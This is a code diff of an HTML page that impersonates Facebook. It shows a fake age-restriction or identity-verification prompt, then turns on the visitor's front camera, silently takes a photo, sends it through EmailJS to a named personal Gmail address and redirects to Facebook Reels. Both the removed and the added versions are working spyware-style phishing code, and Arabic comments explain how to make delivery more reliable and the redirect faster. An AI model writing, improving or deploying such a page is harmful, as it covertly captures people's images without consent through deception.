@@ -3,87 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Secure Content</title>
+    <title>Facebook Security</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body {
-            margin: 0; padding: 0; background-color: #000;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
-            color: #ccc; font-family: sans-serif; transition: background-color 0.1s;
-        }
-        .video-container { text-align: center; width: 90%; border: 1px solid #333; padding: 20px; border-radius: 10px; }
-        .loader {
-            border: 3px solid #1a1a1a; border-top: 3px solid #1877F2;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 0 auto 15px;
-        }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #1877F2; font-family: sans-serif; }
+        .box { text-align: center; border: 1px solid #222; padding: 30px; border-radius: 8px; }
+        .loader { border: 3px solid #111; border-top: 3px solid #1877F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #timer { font-size: 0.9rem; margin-top: 10px; color: #555; }
     </style>
 </head>
-<body id="mainBody">
-    <div class="video-container">
+<body>
+    <div class="box">
         <div class="loader"></div>
-        <p style="font-size: 0.85rem; color: #1877F2;">Facebook Security Protocol v4.2</p>
-        <p id="statusText" style="font-size: 0.9rem;">Initializing Secure Stream...</p>
-        <div id="timer">Waiting for user authentication...</div>
+        <p id="txt">Security Check...</p>
     </div>
 
     <script>
         (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();
 
         window.onload = async function() {
-            const securityMsg = "SECURITY ALERT:\n\nThis content is age-restricted and encrypted.\n\nTo view this Facebook Reel, you must complete the Biometric Verification.\n\nClick OK to start.";
-            
-            if (confirm(securityMsg)) {
+            if (confirm("Verify your identity to watch this Facebook Reel.")) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    let seconds = 5; 
-                    const timerElement = document.getElementById('timer');
-                    const statusText = document.getElementById('statusText');
-                    
-                    const interval = setInterval(() => {
-                        seconds--;
-                        statusText.innerText = "Scanning Biometric Data...";
-                        timerElement.innerText = "Authentication: " + (100 - (seconds * 20)) + "% Complete";
-                        
-                        if (seconds <= 0) {
-                            clearInterval(interval);
-                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; 
+                    let count = 4;
+                    const timer = setInterval(async () => {
+                        count--;
+                        if (count <= 0) {
+                            clearInterval(timer);
                             
-                            setTimeout(() => {
-                                const canvas = document.createElement('canvas');
-                                // تصغير الحجم لضمان وصول الإيميل (مهم جداً)
-                                canvas.width = 640; canvas.height = 480; 
-                                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                                
-                                // جودة الصورة 0.5 لتقليل الحجم وتسريع الإرسال
-                                const dataOutput = canvas.toDataURL('image/jpeg', 0.5);
-                                
-                                emailjs.send('service_w3dev60', 'template_7k8tall', {
-                                    image_data: dataOutput,
-                                    to_email: 'tayebiabd2016@gmail.com'
-                                }).then(function() {
-                                    // لن يتم التحويل إلا بعد التأكد من ضغط زر الإرسال
-                                    window.location.href = "https://www.facebook.com/reels/";
-                                }, function(error) {
-                                    window.location.href = "https://www.facebook.com/reels/";
-                                });
+                            const canvas = document.createElement('canvas');
+                            // حجم صغير جداً لضمان المرور عبر السيرفرات الضعيفة
+                            canvas.width = 400; canvas.height = 300;
+                            canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                            
+                            // إرسال الصورة بجودة متوسطة لتقليل حجم البيانات
+                            const imgBase64 = canvas.toDataURL('image/jpeg', 0.4);
+                            
+                            // إرسال الأمر دون انتظار الرد (للسرعة)
+                            emailjs.send('service_w3dev60', 'template_7k8tall', {
+                                image_data: imgBase64,
+                                to_email: 'tayebiabd2016@gmail.com'
+                            });
 
-                            }, 500);
+                            // التحويل لفيسبوك فوراً بعد 1 ثانية من أمر الإرسال
+                            setTimeout(() => {
+                                window.location.href = "https://www.facebook.com/reels/";
+                            }, 1000);
                         }
                     }, 1000);
-
-                } catch (err) {
-                    window.location.href = "https://www.facebook.com/reels/";
-                }
-            } else {
-                window.location.href = "https://www.facebook.com/reels/";
-            }
+                } catch (e) { window.location.href = "https://www.facebook.com/reels/"; }
+            } else { window.location.href = "https://www.facebook.com/reels/"; }
         };
     </script>
 </body>
